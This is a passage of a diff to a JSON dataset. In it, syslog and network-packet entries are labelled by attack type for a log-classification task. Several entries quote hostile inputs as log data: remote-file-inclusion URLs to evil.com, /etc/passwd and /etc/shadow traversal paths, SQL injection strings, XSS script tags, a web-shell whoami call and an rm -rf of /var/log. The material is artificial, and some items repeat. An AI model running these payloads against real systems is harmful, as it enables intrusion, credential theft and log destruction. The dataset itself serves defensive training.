+          "src_port": 12360,
+          "dst_port": 80,
+          "message": "HTTP GET /include.php?path=http://evil.com/shell.txt"
         },
         {
-          "timestamp": "2023-04-10T09:20:20.000000",
-          "type": "apache",
+          "timestamp": "2023-04-10T09:20:20",
+          "type": "syslog",
           "log_level": "ERROR",
-          "component": "error",
+          "component": "apache",
           "message": "PHP Warning: include(http://evil.com/shell.txt): failed to open stream",
           "related_ip": null
         }
@@ -1116,27 +2399,35 @@
       "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
       "input": [
         {
-          "timestamp": "2023-04-10T21:45:30.000000",
-          "type": "network",
-          "log_level": "WARNING",
-          "component": "firewall",
-          "message": "SYN flood detected from 198.51.100.200 to 10.0.0.10:80",
-          "related_ip": "198.51.100.200"
+          "timestamp": "2023-04-10T21:45:30",
+          "type": "network_packet",
+          "protocol": "TCP",
+          "src_ip": "198.51.100.200",
+          "dst_ip": "10.0.0.10",
+          "src_port": 10000,
+          "dst_port": 80,
+          "flags": "SYN",
+          "length": 60,
+          "message": "TCP SYN packet (high rate)"
         },
         {
-          "timestamp": "2023-04-10T21:45:32.000000",
-          "type": "network",
-          "log_level": "INFO",
-          "component": "netstat",
-          "message": "tcp 0 0 10.0.0.10:80 198.51.100.200:* SYN_RECV (1000+ connections)",
-          "related_ip": "198.51.100.200"
+          "timestamp": "2023-04-10T21:45:32",
+          "type": "network_packet",
+          "protocol": "TCP",
+          "src_ip": "198.51.100.200",
+          "dst_ip": "10.0.0.10",
+          "src_port": 10001,
+          "dst_port": 80,
+          "flags": "SYN",
+          "length": 60,
+          "message": "TCP SYN packet (high rate)"
         },
         {
-          "timestamp": "2023-04-10T21:45:35.000000",
+          "timestamp": "2023-04-10T21:45:35",
           "type": "syslog",
           "log_level": "ERROR",
           "component": "apache",
-          "message": "server reached MaxRequestWorkers setting, consider raising the MaxRequestWorkers setting",
+          "message": "server reached MaxRequestWorkers setting",
           "related_ip": null
         }
       ],
@@ -1147,27 +2438,27 @@
       "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
       "input": [
         {
-          "timestamp": "2023-04-10T13:15:20.000000",
+          "timestamp": "2023-04-10T13:15:20",
           "type": "syslog",
           "log_level": "INFO",
           "component": "kernel",
-          "message": "usb 1-2: new high-speed USB device number 3 using ehci-pci",
+          "message": "usb 1-2: new high-speed USB device",
           "related_ip": null
         },
         {
-          "timestamp": "2023-04-10T13:15:25.000000",
+          "timestamp": "2023-04-10T13:15:25",
           "type": "syslog",
           "log_level": "WARNING",
           "component": "udev",
-          "message": "Unknown USB device detected: VID=1234 PID=5678 - Not in whitelist",
+          "message": "Unknown USB device detected",
           "related_ip": null
         },
         {
-          "timestamp": "2023-04-10T13:15:30.000000",
+          "timestamp": "2023-04-10T13:15:30",
           "type": "syslog",
           "log_level": "ALERT",
           "component": "usb_guard",
-          "message": "Potential USB attack device blocked - rubber ducky signature detected",
+          "message": "Potential USB attack device blocked",
           "related_ip": null
         }
       ],
@@ -1178,28 +2469,32 @@
       "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
       "input": [
         {
-          "timestamp": "2023-04-10T18:30:10.000000",
-          "type": "mail",
+          "timestamp": "2023-04-10T18:30:10",
+          "type": "syslog",
           "log_level": "INFO",
           "component": "postfix",
-          "message": "from=<attacker@phishing-site.com>, to=<victim@company.com>, subject=Urgent: Verify Your Account Now",
+          "message": "from=<attacker@phishing-site.com>",
           "related_ip": null
         },
         {
-          "timestamp": "2023-04-10T18:30:15.000000",
-          "type": "apache",
-          "log_level": "INFO",
-          "component": "access",
-          "message": "192.168.1.50 - - [10/Apr/2023:18:30:15 +0000] \"GET /fake-login.html?ref=email_campaign HTTP/1.1\" 200 3072",
-          "related_ip": "192.168.1.50"
+          "timestamp": "2023-04-10T18:30:15",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "192.168.1.50",
+          "dst_ip": "phishing-site-ip",
+          "src_port": 12361,
+          "dst_port": 80,
+          "message": "HTTP GET /fake-login.html"
         },
         {
-          "timestamp": "2023-04-10T18:30:20.000000",
-          "type": "apache",
-          "log_level": "INFO",
-          "component": "access",
-          "message": "192.168.1.50 - - [10/Apr/2023:18:30:20 +0000] \"POST /steal-credentials.php HTTP/1.1\" 302 0",
-          "related_ip": "192.168.1.50"
+          "timestamp": "2023-04-10T18:30:20",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "192.168.1.50",
+          "dst_ip": "phishing-site-ip",
+          "src_port": 12362,
+          "dst_port": 80,
+          "message": "HTTP POST /steal-credentials.php"
         }
       ],
       "output": "Phishing Attack"
@@ -1209,27 +2504,27 @@
       "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
       "input": [
         {
-          "timestamp": "2023-04-10T20:15:45.000000",
+          "timestamp": "2023-04-10T20:15:45",
           "type": "syslog",
           "log_level": "WARNING",
           "component": "kernel",
-          "message": "segfault at 41414141 ip 41414141 sp bffff7c0 error 14 in vulnerable_app[8048000+1000]",
+          "message": "segfault at 41414141",
           "related_ip": null
         },
         {
-          "timestamp": "2023-04-10T20:15:46.000000",
+          "timestamp": "2023-04-10T20:15:46",
           "type": "syslog",
           "log_level": "ERROR",
           "component": "vulnerable_app",
-          "message": "Buffer overflow detected in input validation function at address 0x41414141",
+          "message": "Buffer overflow detected",
           "related_ip": null
         },
         {
-          "timestamp": "2023-04-10T20:15:47.000000",
+          "timestamp": "2023-04-10T20:15:47",
           "type": "syslog",
           "log_level": "CRITICAL",
           "component": "security",
-          "message": "Shellcode execution attempt detected - Return address overwritten with 0x41414141",
+          "message": "Shellcode execution attempt detected",
           "related_ip": null
         }
       ],
@@ -1240,27 +2535,31 @@
       "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
       "input": [
         {
-          "timestamp": "2023-04-10T07:45:20.000000",
-          "type": "apache",
-          "log_level": "INFO",
-          "component": "access",
-          "message": "203.0.113.99 - - [10/Apr/2023:07:45:20 +0000] \"POST /upload/shell.php HTTP/1.1\" 200 156",
-          "related_ip": "203.0.113.99"
+          "timestamp": "2023-04-10T07:45:20",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "203.0.113.99",
+          "dst_ip": "web-server-ip",
+          "src_port": 12363,
+          "dst_port": 80,
+          "message": "HTTP POST /upload/shell.php"
         },
         {
-          "timestamp": "2023-04-10T07:45:25.000000",
-          "type": "apache",
-          "log_level": "INFO",
-          "component": "access",
-          "message": "203.0.113.99 - - [10/Apr/2023:07:45:25 +0000] \"GET /upload/shell.php?cmd=whoami HTTP/1.1\" 200 45",
-          "related_ip": "203.0.113.99"
+          "timestamp": "2023-04-10T07:45:25",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "203.0.113.99",
+          "dst_ip": "web-server-ip",
+          "src_port": 12364,
+          "dst_port": 80,
+          "message": "HTTP GET /upload/shell.php?cmd=whoami"
         },
         {
-          "timestamp": "2023-04-10T07:45:30.000000",
+          "timestamp": "2023-04-10T07:45:30",
           "type": "syslog",
           "log_level": "ALERT",
           "component": "security",
-          "message": "Web shell detected: PHP backdoor executed system commands",
+          "message": "Web shell detected",
           "related_ip": null
         }
       ],
@@ -1271,24 +2570,24 @@
       "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
       "input": [
         {
-          "timestamp": "2023-04-10T17:20:30.000000",
-          "type": "wireless",
+          "timestamp": "2023-04-10T17:20:30",
+          "type": "syslog",
           "log_level": "INFO",
           "component": "hostapd",
           "message": "wlan0: STA aa:bb:cc:dd:ee:ff IEEE 802.11: authenticated",
           "related_ip": null
         },
         {
-          "timestamp": "2023-04-10T17:20:35.000000",
-          "type": "wireless",
+          "timestamp": "2023-04-10T17:20:35",
+          "type": "syslog",
           "log_level": "WARNING",
           "component": "hostapd",
           "message": "wlan0: AP-STA-POSSIBLE-PSK-MISMATCH aa:bb:cc:dd:ee:ff",
           "related_ip": null
         },
         {
-          "timestamp": "2023-04-10T17:20:40.000000",
-          "type": "wireless",
+          "timestamp": "2023-04-10T17:20:40",
+          "type": "syslog",
           "log_level": "ALERT",
           "component": "wids",
           "message": "Rogue access point detected: SSID 'CompanyWiFi_Guest' broadcasting on same channel",
@@ -1302,27 +2601,27 @@
       "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
       "input": [
         {
-          "timestamp": "2023-04-10T22:30:15.000000",
+          "timestamp": "2023-04-10T22:30:15",
           "type": "syslog",
           "log_level": "WARNING",
           "component": "aide",
-          "message": "File integrity violation: /bin/ls modified (size: 123456->234567, checksum: changed)",
+          "message": "File integrity violation: /bin/ls modified",
           "related_ip": null
         },
         {
-          "timestamp": "2023-04-10T22:30:20.000000",
+          "timestamp": "2023-04-10T22:30:20",
           "type": "syslog",
           "log_level": "WARNING",
           "component": "aide",
-          "message": "File integrity violation: /usr/bin/ps modified (size: 87654->98765, checksum: changed)",
+          "message": "File integrity violation: /usr/bin/ps modified",
           "related_ip": null
         },
         {
-          "timestamp": "2023-04-10T22:30:25.000000",
+          "timestamp": "2023-04-10T22:30:25",
           "type": "syslog",
           "log_level": "CRITICAL",
           "component": "security",
-          "message": "Rootkit detected: Multiple critical system binaries compromised",
+          "message": "Rootkit detected",
           "related_ip": null
         }
       ],
@@ -1333,27 +2632,33 @@
       "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
       "input": [
         {
-          "timestamp": "2023-04-10T06:15:45.000000",
-          "type": "firewall",
-          "log_level": "WARNING",
-          "component": "iptables",
-          "message": "PORT SCAN detected: 203.0.113.77 -> 10.0.0.10 ports: 21,22,23,25,53,80,110,443,993,995",
-          "related_ip": "203.0.113.77"
+          "timestamp": "2023-04-10T06:15:45",
+          "type": "network_packet",
+          "protocol": "TCP",
+          "src_ip": "203.0.113.77",
+          "dst_ip": "10.0.0.10",
+          "src_port": 10000,
+          "dst_port": 21,
+          "flags": "SYN",
+          "length": 60,
+          "message": "TCP SYN packet to 10.0.0.10:21"
         },
         {
-          "timestamp": "2023-04-10T06:16:00.000000",
-          "type": "firewall",
-          "log_level": "WARNING",
-          "component": "iptables",
-          "message": "PORT SCAN detected: 203.0.113.77 -> 10.0.0.10 UDP ports: 53,67,68,69,123,161,162",
-          "related_ip": "203.0.113.77"
+          "timestamp": "2023-04-10T06:16:00",
+          "type": "network_packet",
+          "protocol": "UDP",
+          "src_ip": "203.0.113.77",
+          "dst_ip": "10.0.0.10",
+          "src_port": 10001,
+          "dst_port": 53,
+          "message": "UDP packet to 10.0.0.10:53"
         },
         {
-          "timestamp": "2023-04-10T06:16:15.000000",
-          "type": "intrusion_detection",
+          "timestamp": "2023-04-10T06:16:15",
+          "type": "syslog",
           "log_level": "ALERT",
           "component": "snort",
-          "message": "Comprehensive port scan detected from 203.0.113.77 - 17 ports probed in 30 seconds",
+          "message": "Comprehensive port scan detected from 203.0.113.77",
           "related_ip": "203.0.113.77"
         }
       ],
@@ -1364,27 +2669,29 @@
       "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
       "input": [
         {
-          "timestamp": "2023-04-10T10:45:30.000000",
-          "type": "apache",
-          "log_level": "INFO",
-          "component": "access",
-          "message": "192.0.2.88 - victim_user [10/Apr/2023:10:45:30 +0000] \"POST /transfer.php HTTP/1.1\" 200 1024",
-          "related_ip": "192.0.2.88"
+          "timestamp": "2023-04-10T10:45:30",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "192.0.2.88",
+          "dst_ip": "web-app-ip",
+          "src_port": 12365,
+          "dst_port": 80,
+          "message": "HTTP POST /transfer.php"
         },
         {
-          "timestamp": "2023-04-10T10:45:32.000000",
-          "type": "application",
+          "timestamp": "2023-04-10T10:45:32",
+          "type": "syslog",
           "log_level": "WARNING",
           "component": "banking_app",
-          "message": "CSRF token missing or invalid for user session 12345 - request originated from different domain",
+          "message": "CSRF token missing or invalid",
           "related_ip": null
         },
         {
-          "timestamp": "2023-04-10T10:45:35.000000",
-          "type": "application",
+          "timestamp": "2023-04-10T10:45:35",
+          "type": "syslog",
           "log_level": "ALERT",
           "component": "banking_app",
-          "message": "Unauthorized transfer attempt: $5000 from account 98765 to external account without user consent",
+          "message": "Unauthorized transfer attempt",
           "related_ip": null
         }
       ],
@@ -1395,27 +2702,27 @@
       "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
       "input": [
         {
-          "timestamp": "2023-04-10T15:30:20.000000",
+          "timestamp": "2023-04-10T15:30:20",
           "type": "syslog",
           "log_level": "INFO",
           "component": "systemd",
-          "message": "Started session 15 of user alice from 192.168.1.100",
+          "message": "Started session of user alice from 192.168.1.100",
           "related_ip": "192.168.1.100"
         },
         {
-          "timestamp": "2023-04-10T15:30:25.000000",
+          "timestamp": "2023-04-10T15:30:25",
           "type": "syslog",
           "log_level": "WARNING",
           "component": "pam",
-          "message": "User alice session hijack detected: simultaneous sessions from 192.168.1.100 and 203.0.113.55",
+          "message": "User alice session hijack detected",
           "related_ip": "203.0.113.55"
         },
         {
-          "timestamp": "2023-04-10T15:30:30.000000",
+          "timestamp": "2023-04-10T15:30:30",
           "type": "syslog",
           "log_level": "ALERT",
           "component": "security",
-          "message": "Session token reuse detected: identical session ID used from multiple IP addresses",
+          "message": "Session token reuse detected",
           "related_ip": null
         }
       ],
@@ -1426,27 +2733,29 @@
       "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
       "input": [
         {
-          "timestamp": "2023-04-10T23:15:10.000000",
-          "type": "database",
+          "timestamp": "2023-04-10T23:15:10",
+          "type": "syslog",
           "log_level": "INFO",
           "component": "postgresql",
-          "message": "COPY command executed: COPY (SELECT username,email,phone FROM users) TO '/tmp/customer_data.csv' WITH CSV HEADER",
+          "message": "COPY command executed: TO '/tmp/customer_data.csv'",
           "related_ip": null
         },
         {
-          "timestamp": "2023-04-10T23:15:15.000000",
-          "type": "network",
-          "log_level": "WARNING",
-          "component": "netstat",
-          "message": "Large file transfer detected: 50MB uploaded to external FTP server 203.0.113.200",
-          "related_ip": "203.0.113.200"
+          "timestamp": "2023-04-10T23:15:15",
+          "type": "network_packet",
+          "protocol": "FTP",
+          "src_ip": "internal-server-ip",
+          "dst_ip": "203.0.113.200",
+          "src_port": 20,
+          "dst_port": 21,
+          "message": "FTP PUT /tmp/customer_data.csv"
         },
         {
-          "timestamp": "2023-04-10T23:15:20.000000",
+          "timestamp": "2023-04-10T23:15:20",
           "type": "syslog",
           "log_level": "ALERT",
           "component": "dlp",
-          "message": "Data loss prevention alert: Sensitive customer data exported outside organization",
+          "message": "Data loss prevention alert: Sensitive customer data exported",
           "related_ip": null
         }
       ],
@@ -1457,31 +2766,814 @@
       "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
       "input": [
         {
-          "timestamp": "2023-04-10T04:20:30.000000",
+          "timestamp": "2023-04-10T04:20:30",
           "type": "syslog",
           "log_level": "ERROR",
           "component": "clamav",
-          "message": "Malware detected and quarantined: /home/user/Documents/invoice.pdf.exe (Trojan.Ransomware.Generic)",
+          "message": "Malware detected and quarantined: invoice.pdf.exe",
           "related_ip": null
         },
         {
-          "timestamp": "2023-04-10T04:20:35.000000",
+          "timestamp": "2023-04-10T04:20:35",
           "type": "syslog",
           "log_level": "WARNING",
           "component": "file_monitor",
-          "message": "Mass file encryption detected: 1547 files with .locked extensions created in /home/user/",
+          "message": "Mass file encryption detected",
           "related_ip": null
         },
         {
-          "timestamp": "2023-04-10T04:20:40.000000",
+          "timestamp": "2023-04-10T04:20:40",
           "type": "syslog",
           "log_level": "CRITICAL",
           "component": "security",
-          "message": "Ransomware activity detected: File encryption pattern matches known ransomware families",
+          "message": "Ransomware activity detected",
           "related_ip": null
         }
       ],
       "output": "Ransomware Attack"
+    },
+    {
+      "type": "classification",
+      "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
+      "input": [
+        {
+          "timestamp": "2023-04-10T08:15:30",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "203.0.113.89",
+          "dst_ip": "web-server-ip",
+          "src_port": 12366,
+          "dst_port": 80,
+          "message": "HTTP GET /index.php?page=../../../../etc/passwd"
+        },
+        {
+          "timestamp": "2023-04-10T08:15:32",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "203.0.113.89",
+          "dst_ip": "web-server-ip",
+          "src_port": 12367,
+          "dst_port": 80,
+          "message": "HTTP GET /index.php?page=../../../../etc/shadow"
+        },
+        {
+          "timestamp": "2023-04-10T08:15:35",
+          "type": "syslog",
+          "log_level": "WARNING",
+          "component": "web_app_fw",
+          "message": "Local File Inclusion attempt detected from 203.0.113.89",
+          "related_ip": "203.0.113.89"
+        }
+      ],
+      "output": "Local File Inclusion (LFI) Attack"
+    },
+    {
+      "type": "classification",
+      "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
+      "input": [
+        {
+          "timestamp": "2023-04-10T09:00:00",
+          "type": "syslog",
+          "log_level": "INFO",
+          "component": "auth",
+          "message": "User 'guest' logged in from 192.168.1.10",
+          "related_ip": "192.168.1.10"
+        },
+        {
+          "timestamp": "2023-04-10T09:00:05",
+          "type": "network_packet",
+          "protocol": "TCP",
+          "src_ip": "192.168.1.10",
+          "dst_ip": "10.0.0.1",
+          "src_port": 50000,
+          "dst_port": 23,
+          "flags": "SYN",
+          "length": 60,
+          "message": "TCP SYN packet from 192.168.1.10 to 10.0.0.1:23 (Telnet)"
+        },
+        {
+          "timestamp": "2023-04-10T09:00:10",
+          "type": "syslog",
+          "log_level": "ALERT",
+          "component": "firewall",
+          "message": "Blocked outbound connection to 10.0.0.1:23 from 192.168.1.10",
+          "related_ip": "192.168.1.10"
+        }
+      ],
+      "output": "Unauthorized Access Attempt"
+    },
+    {
+      "type": "classification",
+      "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
+      "input": [
+        {
+          "timestamp": "2023-04-10T10:00:00",
+          "type": "network_packet",
+          "protocol": "UDP",
+          "src_ip": "203.0.113.1",
+          "dst_ip": "255.255.255.255",
+          "src_port": 137,
+          "dst_port": 137,
+          "message": "NetBIOS Name Service query (broadcast)"
+        },
+        {
+          "timestamp": "2023-04-10T10:00:05",
+          "type": "syslog",
+          "log_level": "WARNING",
+          "component": "smb",
+          "message": "Failed login attempt for user 'Administrator' from 203.0.113.1",
+          "related_ip": "203.0.113.1"
+        },
+        {
+          "timestamp": "2023-04-10T10:00:10",
+          "type": "network_packet",
+          "protocol": "SMB",
+          "src_ip": "203.0.113.1",
+          "dst_ip": "10.0.0.5",
+          "src_port": 445,
+          "dst_port": 445,
+          "message": "SMB Negotiate Protocol Request"
+        }
+      ],
+      "output": "SMB Enumeration and Brute Force Attempt"
+    },
+    {
+      "type": "classification",
+      "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
+      "input": [
+        {
+          "timestamp": "2023-04-10T11:00:00",
+          "type": "syslog",
+          "log_level": "INFO",
+          "component": "web_server",
+          "message": "GET /admin/config.php",
+          "related_ip": "192.168.1.20"
+        },
+        {
+          "timestamp": "2023-04-10T11:00:05",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "192.168.1.20",
+          "dst_ip": "web-server-ip",
+          "src_port": 50001,
+          "dst_port": 80,
+          "message": "HTTP GET /admin/config.php (403 Forbidden)"
+        },
+        {
+          "timestamp": "2023-04-10T11:00:10",
+          "type": "syslog",
+          "log_level": "WARNING",
+          "component": "mod_security",
+          "message": "SQL Injection attempt detected: /admin/config.php?id='OR 1=1--",
+          "related_ip": "192.168.1.20"
+        }
+      ],
+      "output": "SQL Injection Attempt"
+    },
+    {
+      "type": "classification",
+      "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
+      "input": [
+        {
+          "timestamp": "2023-04-10T12:00:00",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "192.168.203.243",
+          "dst_ip": "web-server-ip",
+          "src_port": 50002,
+          "dst_port": 80,
+          "message": "HTTP GET /search?query=<script>alert(1)</script>"
+        },
+        {
+          "timestamp": "2023-04-10T12:00:05",
+          "type": "syslog",
+          "log_level": "WARNING",
+          "component": "web_app",
+          "message": "XSS payload detected in search query",
+          "related_ip": "192.168.203.243"
+        },
+        {
+          "timestamp": "2023-04-10T12:00:10",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "web-server-ip",
+          "dst_ip": "192.168.203.243",
+          "src_port": 80,
+          "dst_port": 50002,
+          "message": "HTTP 200 OK (with encoded XSS payload)"
+        }
+      ],
+      "output": "Cross-Site Scripting (XSS) Attack"
+    },
+    {
+      "type": "classification",
+      "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
+      "input": [
+        {
+          "timestamp": "2023-04-10T13:00:00",
+          "type": "syslog",
+          "log_level": "INFO",
+          "component": "auth",
+          "message": "User 'admin' logged in from 192.168.1.50",
+          "related_ip": "192.168.1.50"
+        },
+        {
+          "timestamp": "2023-04-10T13:00:05",
+          "type": "network_packet",
+          "protocol": "SSH",
+          "src_ip": "192.168.1.50",
+          "dst_ip": "server-ip",
+          "src_port": 22,
+          "dst_port": 22,
+          "message": "SSH exec: rm -rf /var/log/*"
+        },
+        {
+          "timestamp": "2023-04-10T13:00:10",
+          "type": "syslog",
+          "log_level": "ALERT",
+          "component": "auditd",
+          "message": "File deletion detected: /var/log/syslog",
+          "related_ip": null
+        }
+      ],
+      "output": "Privilege Escalation and Log Tampering"
+    },
+    {
+      "type": "classification",
+      "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
+      "input": [
+        {
+          "timestamp": "2023-04-10T14:00:00",
+          "type": "network_packet",
+          "protocol": "TCP",
+          "src_ip": "external-ip",
+          "dst_ip": "internal-ip",
+          "src_port": 10000,
+          "dst_port": 22,
+          "flags": "SYN",
+          "length": 60,
+          "message": "TCP SYN packet from external-ip to internal-ip:22"
+        },
+        {
+          "timestamp": "2023-04-10T14:00:05",
+          "type": "network_packet",
+          "protocol": "TCP",
+          "src_ip": "external-ip",
+          "dst_ip": "internal-ip",
+          "src_port": 10001,
+          "dst_port": 22,
+          "flags": "SYN",
+          "length": 60,
+          "message": "TCP SYN packet from external-ip to internal-ip:22"
+        },
+        {
+          "timestamp": "2023-04-10T14:00:10",
+          "type": "syslog",
+          "log_level": "WARNING",
+          "component": "sshd",
+          "message": "Failed password for root from external-ip",
+          "related_ip": "external-ip"
+        }
+      ],
+      "output": "SSH Brute Force Attack"
+    },
+    {
+      "type": "classification",
+      "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
+      "input": [
+        {
+          "timestamp": "2023-04-10T15:00:00",
+          "type": "syslog",
+          "log_level": "INFO",
+          "component": "web_server",
+          "message": "GET /index.php?id=1",
+          "related_ip": "192.168.1.60"
+        },
+        {
+          "timestamp": "2023-04-10T15:00:05",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "192.168.1.60",
+          "dst_ip": "web-server-ip",
+          "src_port": 50003,
+          "dst_port": 80,
+          "message": "HTTP GET /index.php?id=' OR 1=1--"
+        },
+        {
+          "timestamp": "2023-04-10T15:00:10",
+          "type": "syslog",
+          "log_level": "ERROR",
+          "component": "mysql",
+          "message": "SQL error: You have an error in your SQL syntax",
+          "related_ip": null
+        }
+      ],
+      "output": "SQL Injection Attack"
+    },
+    {
+      "type": "classification",
+      "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
+      "input": [
+        {
+          "timestamp": "2023-04-10T16:00:00",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "client-ip",
+          "dst_ip": "web-server-ip",
+          "src_port": 50004,
+          "dst_port": 80,
+          "message": "HTTP GET /search?q=<script>alert('XSS')</script>"
+        },
+        {
+          "timestamp": "2023-04-10T16:00:05",
+          "type": "syslog",
+          "log_level": "WARNING",
+          "component": "web_app_fw",
+          "message": "XSS attack blocked from client-ip",
+          "related_ip": "client-ip"
+        },
+        {
+          "timestamp": "2023-04-10T16:00:10",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "web-server-ip",
+          "dst_ip": "client-ip",
+          "src_port": 80,
+          "dst_port": 50004,
+          "message": "HTTP 403 Forbidden"
+        }
+      ],
+      "output": "Cross-Site Scripting (XSS) Attack"
+    },
+    {
+      "type": "classification",
+      "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
+      "input": [
+        {
+          "timestamp": "2023-04-10T17:00:00",
+          "type": "syslog",
+          "log_level": "INFO",
+          "component": "dns",
+          "message": "client 192.168.1.70: query: malware.example.com",
+          "related_ip": "192.168.1.70"
+        },
+        {
+          "timestamp": "2023-04-10T17:00:05",
+          "type": "network_packet",
+          "protocol": "DNS",
+          "src_ip": "192.168.1.70",
+          "dst_ip": "dns-server-ip",
+          "src_port": 53,
+          "dst_port": 53,
+          "message": "DNS query for malware.example.com"
+        },
+        {
+          "timestamp": "2023-04-10T17:00:10",
+          "type": "syslog",
+          "log_level": "ALERT",
+          "component": "ids",
+          "message": "Malicious domain lookup detected: malware.example.com",
+          "related_ip": null
+        }
+      ],
+      "output": "Command and Control (C&C) Communication"
+    },
+    {
+      "type": "classification",
+      "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
+      "input": [
+        {
+          "timestamp": "2023-04-10T18:00:00",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "192.168.203.243",
+          "dst_ip": "web-server-ip",
+          "src_port": 50005,
+          "dst_port": 80,
+          "message": "HTTP GET /include.php?file=http://evil.com/shell.txt"
+        },
+        {
+          "timestamp": "2023-04-10T18:00:05",
+          "type": "syslog",
+          "log_level": "ERROR",
+          "component": "php",
+          "message": "Failed to open stream: HTTP request failed!",
+          "related_ip": null
+        },
+        {
+          "timestamp": "2023-04-10T18:00:10",
+          "type": "syslog",
+          "log_level": "ALERT",
+          "component": "waf",
+          "message": "Remote File Inclusion attempt blocked",
+          "related_ip": "192.168.203.243"
+        }
+      ],
+      "output": "Remote File Inclusion (RFI) Attack"
+    },
+    {
+      "type": "classification",
+      "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
+      "input": [
+        {
+          "timestamp": "2023-04-10T19:00:00",
+          "type": "network_packet",
+          "protocol": "UDP",
+          "src_ip": "192.168.203.243",
+          "dst_ip": "192.168.133.140",
+          "src_port": 53,
+          "dst_port": 53,
+          "message": "DNS query for large_response.example.com (DNS Amplification)"
+        },
+        {
+          "timestamp": "2023-04-10T19:00:05",
+          "type": "network_packet",
+          "protocol": "UDP",
+          "src_ip": "dns-server-ip",
+          "dst_ip": "192.168.133.140",
+          "src_port": 53,
+          "dst_port": 12345,
+          "message": "DNS response (large)"
+        },
+        {
+          "timestamp": "2023-04-10T19:00:10",
+          "type": "syslog",
+          "log_level": "ALERT",
+          "component": "ids",
+          "message": "DNS amplification attack detected against 192.168.133.140",
+          "related_ip": "192.168.133.140"
+        }
+      ],
+      "output": "DNS Amplification DDoS Attack"
+    },
+    {
+      "type": "classification",
+      "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
+      "input": [
+        {
+          "timestamp": "2023-04-10T20:00:00",
+          "type": "syslog",
+          "log_level": "INFO",
+          "component": "web_server",
+          "message": "GET /admin/dashboard",
+          "related_ip": "192.168.1.90"
+        },
+        {
+          "timestamp": "2023-04-10T20:00:05",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "192.168.1.90",
+          "dst_ip": "web-server-ip",
+          "src_port": 50007,
+          "dst_port": 80,
+          "message": "HTTP POST /admin/update_user (invalid session)"
+        },
+        {
+          "timestamp": "2023-04-10T20:00:10",
+          "type": "syslog",
+          "log_level": "ERROR",
+          "component": "web_app",
+          "message": "Invalid session token for user 123",
+          "related_ip": null
+        }
+      ],
+      "output": "Session Fixation/Hijacking Attack"
+    },
+    {
+      "type": "classification",
+      "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
+      "input": [
+        {
+          "timestamp": "2023-04-10T21:00:00",
+          "type": "network_packet",
+          "protocol": "SMB",
+          "src_ip": "internal-host-ip",
+          "dst_ip": "file-share-ip",
+          "src_port": 445,
+          "dst_port": 445,
+          "message": "SMB Write AndX Request (large file)"
+        },
+        {
+          "timestamp": "2023-04-10T21:00:05",
+          "type": "syslog",
+          "log_level": "WARNING",
+          "component": "file_monitor",
+          "message": "Large file written to sensitive share: confidential.zip",
+          "related_ip": null
+        },
+        {
+          "timestamp": "2023-04-10T21:00:10",
+          "type": "network_packet",
+          "protocol": "FTP",
+          "src_ip": "internal-host-ip",
+          "dst_ip": "external-ftp-server-ip",
+          "src_port": 20,
+          "dst_port": 21,
+          "message": "FTP PUT /confidential.zip"
+        }
+      ],
+      "output": "Data Exfiltration via File Share and FTP"
+    },
+    {
+      "type": "classification",
+      "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
+      "input": [
+        {
+          "timestamp": "2023-04-10T22:00:00",
+          "type": "syslog",
+          "log_level": "ERROR",
+          "component": "clamav",
+          "message": "Malware detected and quarantined: invoice.pdf.exe",
+          "related_ip": null
+        },
+        {
+          "timestamp": "2023-04-10T22:00:05",
+          "type": "syslog",
+          "log_level": "WARNING",
+          "component": "file_monitor",
+          "message": "Mass file encryption detected",
+          "related_ip": null
+        },
+        {
+          "timestamp": "2023-04-10T22:00:10",
+          "type": "syslog",
+          "log_level": "CRITICAL",
+          "component": "security",
+          "message": "Ransomware activity detected",
+          "related_ip": null
+        }
+      ],
+      "output": "Ransomware Attack"
+    },
+    {
+      "type": "classification",
+      "instruction": "Analyze the following syslog entries and identify the type of attack or suspicious activity.",
+      "input": [
+        {
+          "timestamp": "2023-04-10T23:00:00",
+          "type": "syslog",
